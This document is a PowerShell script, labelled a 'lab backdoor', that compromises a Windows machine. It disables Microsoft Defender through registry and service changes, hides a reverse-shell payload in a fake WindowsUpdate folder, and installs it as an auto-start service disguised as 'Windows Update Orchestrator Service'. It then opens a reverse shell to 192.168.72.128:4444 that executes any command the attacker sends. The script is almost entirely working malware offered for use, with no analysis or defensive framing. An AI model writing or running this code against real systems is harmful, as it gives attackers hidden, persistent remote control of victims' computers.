$attackerIP = "192.168.72.128"
$port       = 4444

Write-Host "[*] Starting stable lab backdoor..." -ForegroundColor Cyan
# 1. Defender Disable (keep previous aggressive settings)
Write-Host "[+] Disabling Defender..." -ForegroundColor Green
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f | Out-Null

Stop-Service WinDefend -Force -ErrorAction SilentlyContinue
Set-Service WinDefend -StartupType Disabled -ErrorAction SilentlyContinue

# 2. Persistence Setup
$persistDir  = "C:\ProgramData\WindowsUpdate"
$payloadPath = "$persistDir\update.ps1"
$serviceName = "WindowsUpdateOrchestrator"

if (-not (Test-Path $persistDir)) {
    New-Item -Path $persistDir -ItemType Directory -Force | Out-Null
    (Get-Item $persistDir).Attributes = "Hidden"
}

# Improved stable payload
$payload = @'
while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient("192.168.72.128", 4444)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true

        $writer.WriteLine("[+] Stable lab backdoor connected from $env:COMPUTERNAME at $(Get-Date)")
        $writer.Write("PS $($executionContext.SessionState.Path.CurrentLocation)> ")

        while ($true) {
            $command = $reader.ReadLine()
            if ($command) {
                try {
                    $result = Invoke-Expression $command 2>&1 | Out-String
                    $writer.Write($result)
                } catch {
                    $writer.WriteLine("ERROR: $($_.Exception.Message)")
                }
            }
            $writer.Write("PS $($executionContext.SessionState.Path.CurrentLocation)> ")
        }
    } catch {
        Start-Sleep -Seconds 10
    }
}
'@

$payload | Out-File -FilePath $payloadPath -Encoding utf8 -Force
(Get-Item $payloadPath).Attributes = "Hidden"

# Service
$psExe = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$cmd = "`"$psExe`" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$payloadPath`""

if (Get-Service $serviceName -ErrorAction SilentlyContinue) { sc.exe delete $serviceName | Out-Null }

New-Service -Name $serviceName -DisplayName "Windows Update Orchestrator Service" `
            -BinaryPathName $cmd -StartupType Automatic | Out-Null

Start-Service $serviceName -ErrorAction SilentlyContinue

Write-Host "[+] Service persistence created" -ForegroundColor Green

# 3. Immediate stable shell
Write-Host "[+] Starting stable reverse shell..." -ForegroundColor Yellow

Start-Job -ScriptBlock {
    param($ip, $p)
    while ($true) {
        try {
            $client = New-Object System.Net.Sockets.TCPClient($ip, $p)
            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $reader = New-Object System.IO.StreamReader($stream)
            $writer.AutoFlush = $true

            $writer.WriteLine("[+] Stable immediate shell connected at $(Get-Date)")
            $writer.Write("PS $($executionContext.SessionState.Path.CurrentLocation)> ")

            while ($true) {
                $command = $reader.ReadLine()
                if ($command) {
                    try {
                        $result = Invoke-Expression $command 2>&1 | Out-String
                        $writer.Write($result)
                    } catch {
                        $writer.WriteLine("ERROR: $($_.Exception.Message)")
                    }
                }
                $writer.Write("PS $($executionContext.SessionState.Path.CurrentLocation)> ")
            }
        } catch {
            Start-Sleep -Seconds 8
        }
    }
} -ArgumentList $attackerIP, $port | Out-Null

Write-Host "[+] Backdoor setup complete!" -ForegroundColor Green
Write-Host "On attacker: nc -lvnp 4444" -ForegroundColor Cyan